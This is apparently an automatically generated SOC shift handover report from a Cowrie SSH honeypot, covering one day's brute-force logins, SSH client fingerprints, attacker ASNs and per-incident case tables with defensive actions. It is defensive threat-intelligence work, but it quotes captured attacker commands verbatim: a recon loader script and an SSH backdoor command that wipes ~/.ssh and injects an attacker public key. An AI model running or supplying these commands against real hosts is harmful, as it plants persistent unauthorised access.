# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-12 |
| **Generated At** | 2026-08-12T13:18:21Z |
| **Shift Time** | 13:18 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **156** |
| Confirmed Threats | **147** |
| False Positives Filtered | **9** (5.8%) |
| Unique Attacker IPs | **58** |
| Countries of Origin | **23** |
| High Severity Cases | **52** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **104** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **71** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **9** |
| Unique Passwords | **52** |
| Successful Auth Pairs | **58** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 38 |
| `admin` | 14 |
| `support` | 8 |
| `debian` | 3 |
| `GET / HTTP/1.1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 5 |
| `123654` | 4 |
| `` | 4 |
| `support` | 4 |
| `1234567890` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `123654` | 4 |
| `admin` | `` | 4 |
| `support` | `support` | 4 |
| `debian` | `admin` | 3 |
| `admin` | `zxcvbnm` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `123654` | `10.0.0.73` | 2026-08-12T11:00:39 |
| `support` | `support` | `176.53.159.196` | 2026-08-12T11:10:48 |
| `adm` | `adm` | `220.246.46.144` | 2026-08-12T11:12:43 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `185.226.197.43` | 2026-08-12T11:16:45 |
| `admin` | `123654` | `58.226.255.240` | 2026-08-12T11:17:57 |
| `admin` | `123654` | `178.178.194.192` | 2026-08-12T11:18:08 |
| `admin` | `ftpuser` | `103.63.108.25` | 2026-08-12T11:20:11 |
| `345gs5662d34` | `345gs5662d34` | `103.63.108.25` | 2026-08-12T11:20:15 |
| `admin` | `3245gs5662d34` | `103.63.108.25` | 2026-08-12T11:20:17 |
| `admin` | `zxcvbnm` | `203.252.10.4` | 2026-08-12T11:23:13 |
| `admin` | `zxcvbnm` | `218.149.235.152` | 2026-08-12T11:23:27 |
| `support` | `1234567890` | `191.210.73.33` | 2026-08-12T11:46:57 |
| `support` | `1234567890` | `187.8.120.90` | 2026-08-12T11:47:05 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-12T12:00:06 |
| `debian` | `admin` | `10.0.0.73` | 2026-08-12T12:02:33 |
| `root` | `1` | `195.178.110.228` | 2026-08-12T12:05:14 |
| `root` | `12` | `195.178.110.228` | 2026-08-12T12:06:48 |
| `root` | `123` | `195.178.110.228` | 2026-08-12T12:08:23 |
| `support` | `passwd` | `10.0.0.73` | 2026-08-12T12:09:22 |
| `root` | `1234` | `195.178.110.228` | 2026-08-12T12:09:58 |
| `root` | `12345` | `195.178.110.228` | 2026-08-12T12:11:31 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-12T12:13:05 |
| `root` | `1234567` | `195.178.110.228` | 2026-08-12T12:14:29 |
| `root` | `Ctyun@123` | `183.6.64.180` | 2026-08-12T12:14:46 |
| `root` | `Tianyiyun0512@` | `183.6.64.180` | 2026-08-12T12:14:51 |
| `root` | `12345678` | `195.178.110.228` | 2026-08-12T12:16:04 |
| `support` | `support` | `10.0.0.73` | 2026-08-12T12:16:55 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-12T12:17:05 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-12T12:17:05 |
| `root` | `123456789` | `195.178.110.228` | 2026-08-12T12:17:34 |
| `root` | `1234567890` | `195.178.110.228` | 2026-08-12T12:19:04 |
| `root` | `123qwe` | `195.178.110.228` | 2026-08-12T12:20:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `47.254.215.142` | 2026-08-12T12:21:15 |
| `debian` | `admin` | `74.119.147.213` | 2026-08-12T12:21:19 |
| `root` | `123qwerty` | `195.178.110.228` | 2026-08-12T12:22:06 |
| `root` | `21` | `195.178.110.228` | 2026-08-12T12:23:37 |
| `root` | `321` | `195.178.110.228` | 2026-08-12T12:25:09 |
| `root` | `4321` | `195.178.110.228` | 2026-08-12T12:26:44 |
| `support` | `passwd` | `112.161.26.125` | 2026-08-12T12:26:52 |
| `root` | `54321` | `195.178.110.228` | 2026-08-12T12:28:26 |
| `root` | `654321` | `195.178.110.228` | 2026-08-12T12:29:59 |
| `root` | `P4ssw0rd` | `195.178.110.228` | 2026-08-12T12:31:25 |
| `root` | `P4ssword` | `195.178.110.228` | 2026-08-12T12:32:54 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-08-12T12:34:33 |
| `root` | `Passw0rd` | `195.178.110.228` | 2026-08-12T12:36:18 |
| `ubnt` | `112233` | `10.0.0.73` | 2026-08-12T12:37:02 |
| `root` | `p4ssword` | `195.178.110.228` | 2026-08-12T12:37:48 |
| `root` | `p@ssw0rd` | `195.178.110.228` | 2026-08-12T12:39:16 |
| `user` | `Admin@123` | `10.0.0.73` | 2026-08-12T12:40:04 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-08-12T12:40:43 |
| `root` | `password` | `195.178.110.228` | 2026-08-12T12:42:11 |
| `root` | `qwerty` | `195.178.110.228` | 2026-08-12T12:43:42 |
| `root` | `root1` | `195.178.110.228` | 2026-08-12T12:46:44 |
| `root` | `root12` | `195.178.110.228` | 2026-08-12T12:48:20 |
| `root` | `root123` | `195.178.110.228` | 2026-08-12T12:49:59 |
| `root` | `root1234` | `195.178.110.228` | 2026-08-12T12:51:29 |
| `root` | `root12345` | `195.178.110.228` | 2026-08-12T12:52:55 |
| `root` | `root123456` | `195.178.110.228` | 2026-08-12T12:54:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **156** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 39 |
| OpenSSH | 14 |
| libssh | 12 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 33 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 9 | 9 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 33 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 9 | 9 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 4 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `1616c6d18e84...` | libssh | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 31 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.63.108.25`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **58** |
| Unique ASNs | **46** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS21859` | Zenlayer Inc | 4 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (52)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f5f3b0136f7f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 11:10 |
| **Last Seen** | 2026-08-12 11:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:10:48` | `cowrie.session.connect` |
| `2026-08-12 11:10:48` | `cowrie.client.version` |
| `2026-08-12 11:10:48` | `cowrie.client.kex` |
| `2026-08-12 11:10:48` | `cowrie.login.success` |
| `2026-08-12 11:10:48` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:10:48` | `cowrie.direct-tcpip.data` |
| `2026-08-12 11:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95a6e3fb7af7

| Field | Detail |
|---|---|
| **Source IP** | `220.246.46[.]144` |
| **First Seen** | 2026-08-12 11:12 |
| **Last Seen** | 2026-08-12 11:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:12:40` | `cowrie.session.connect` |
| `2026-08-12 11:12:41` | `cowrie.client.version` |
| `2026-08-12 11:12:41` | `cowrie.client.kex` |
| `2026-08-12 11:12:43` | `cowrie.login.success` |
| `2026-08-12 11:12:43` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.46[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.246.46[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a578507df8

| Field | Detail |
|---|---|
| **Source IP** | `185.226.197[.]43` |
| **First Seen** | 2026-08-12 11:16 |
| **Last Seen** | 2026-08-12 11:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:16:45` | `cowrie.session.connect` |
| `2026-08-12 11:16:45` | `cowrie.login.success` |
| `2026-08-12 11:16:45` | `cowrie.session.params` |
| `2026-08-12 11:16:45` | `cowrie.command.input` |
| `2026-08-12 11:16:45` | `cowrie.command.input` |
| `2026-08-12 11:16:46` | `cowrie.command.failed` |
| `2026-08-12 11:16:46` | `cowrie.command.input` |
| `2026-08-12 11:16:46` | `cowrie.command.failed` |
| `2026-08-12 11:16:46` | `cowrie.command.input` |
| `2026-08-12 11:16:46` | `cowrie.log.closed` |
| `2026-08-12 11:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.226.197[.]43` to AbuseIPDB if not already reported
- [ ] Block `185.226.197[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce5536930b7

| Field | Detail |
|---|---|
| **Source IP** | `58.226.255[.]240` |
| **First Seen** | 2026-08-12 11:17 |
| **Last Seen** | 2026-08-12 11:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:17:54` | `cowrie.session.connect` |
| `2026-08-12 11:17:55` | `cowrie.client.version` |
| `2026-08-12 11:17:55` | `cowrie.client.kex` |
| `2026-08-12 11:17:57` | `cowrie.login.success` |
| `2026-08-12 11:17:57` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.226.255[.]240` to AbuseIPDB if not already reported
- [ ] Block `58.226.255[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96a3b9326f1

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]192` |
| **First Seen** | 2026-08-12 11:18 |
| **Last Seen** | 2026-08-12 11:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:18:07` | `cowrie.session.connect` |
| `2026-08-12 11:18:07` | `cowrie.client.version` |
| `2026-08-12 11:18:07` | `cowrie.client.kex` |
| `2026-08-12 11:18:08` | `cowrie.login.success` |
| `2026-08-12 11:18:09` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]192` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77fec8f65c5c

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-08-12 11:20 |
| **Last Seen** | 2026-08-12 11:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:20:09` | `cowrie.session.connect` |
| `2026-08-12 11:20:09` | `cowrie.client.version` |
| `2026-08-12 11:20:10` | `cowrie.client.kex` |
| `2026-08-12 11:20:11` | `cowrie.login.success` |
| `2026-08-12 11:20:12` | `cowrie.session.params` |
| `2026-08-12 11:20:12` | `cowrie.command.input` |
| `2026-08-12 11:20:12` | `cowrie.command.failed` |
| `2026-08-12 11:20:12` | `cowrie.log.closed` |
| `2026-08-12 11:20:13` | `cowrie.session.params` |
| `2026-08-12 11:20:13` | `cowrie.command.input` |
| `2026-08-12 11:20:13` | `cowrie.session.file_download` |
| `2026-08-12 11:20:13` | `cowrie.log.closed` |
| `2026-08-12 11:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0af938aaaade

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-08-12 11:20 |
| **Last Seen** | 2026-08-12 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:20:13` | `cowrie.session.connect` |
| `2026-08-12 11:20:13` | `cowrie.client.version` |
| `2026-08-12 11:20:14` | `cowrie.client.kex` |
| `2026-08-12 11:20:15` | `cowrie.login.success` |
| `2026-08-12 11:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b1c1a5002e

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-08-12 11:20 |
| **Last Seen** | 2026-08-12 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:20:15` | `cowrie.session.connect` |
| `2026-08-12 11:20:15` | `cowrie.client.version` |
| `2026-08-12 11:20:16` | `cowrie.client.kex` |
| `2026-08-12 11:20:17` | `cowrie.login.success` |
| `2026-08-12 11:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca25b9c9cdc

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-12 11:23 |
| **Last Seen** | 2026-08-12 11:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:23:10` | `cowrie.session.connect` |
| `2026-08-12 11:23:11` | `cowrie.client.version` |
| `2026-08-12 11:23:11` | `cowrie.client.kex` |
| `2026-08-12 11:23:13` | `cowrie.login.success` |
| `2026-08-12 11:23:14` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12dbfa2cfd66

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-08-12 11:23 |
| **Last Seen** | 2026-08-12 11:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:23:24` | `cowrie.session.connect` |
| `2026-08-12 11:23:24` | `cowrie.client.version` |
| `2026-08-12 11:23:24` | `cowrie.client.kex` |
| `2026-08-12 11:23:27` | `cowrie.login.success` |
| `2026-08-12 11:23:28` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc2d9310cffe

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-08-12 11:46 |
| **Last Seen** | 2026-08-12 11:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:46:55` | `cowrie.session.connect` |
| `2026-08-12 11:46:55` | `cowrie.client.version` |
| `2026-08-12 11:46:55` | `cowrie.client.kex` |
| `2026-08-12 11:46:57` | `cowrie.login.success` |
| `2026-08-12 11:46:58` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1156681dbecf

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-12 11:47 |
| **Last Seen** | 2026-08-12 11:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:47:03` | `cowrie.session.connect` |
| `2026-08-12 11:47:03` | `cowrie.client.version` |
| `2026-08-12 11:47:03` | `cowrie.client.kex` |
| `2026-08-12 11:47:05` | `cowrie.login.success` |
| `2026-08-12 11:47:06` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc9b4ee90955

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 11:53 |
| **Last Seen** | 2026-08-12 11:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 11:53:05` | `cowrie.session.connect` |
| `2026-08-12 11:53:05` | `cowrie.client.version` |
| `2026-08-12 11:53:05` | `cowrie.client.kex` |
| `2026-08-12 11:53:06` | `cowrie.login.success` |
| `2026-08-12 11:53:06` | `cowrie.direct-tcpip.request` |
| `2026-08-12 11:53:06` | `cowrie.direct-tcpip.data` |
| `2026-08-12 11:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110835ecefe9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:05 |
| **Last Seen** | 2026-08-12 12:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:05:12` | `cowrie.session.connect` |
| `2026-08-12 12:05:12` | `cowrie.client.version` |
| `2026-08-12 12:05:12` | `cowrie.client.kex` |
| `2026-08-12 12:05:14` | `cowrie.login.success` |
| `2026-08-12 12:05:15` | `cowrie.session.params` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.success` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:15` | `cowrie.command.input` |
| `2026-08-12 12:05:16` | `cowrie.log.closed` |
| `2026-08-12 12:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
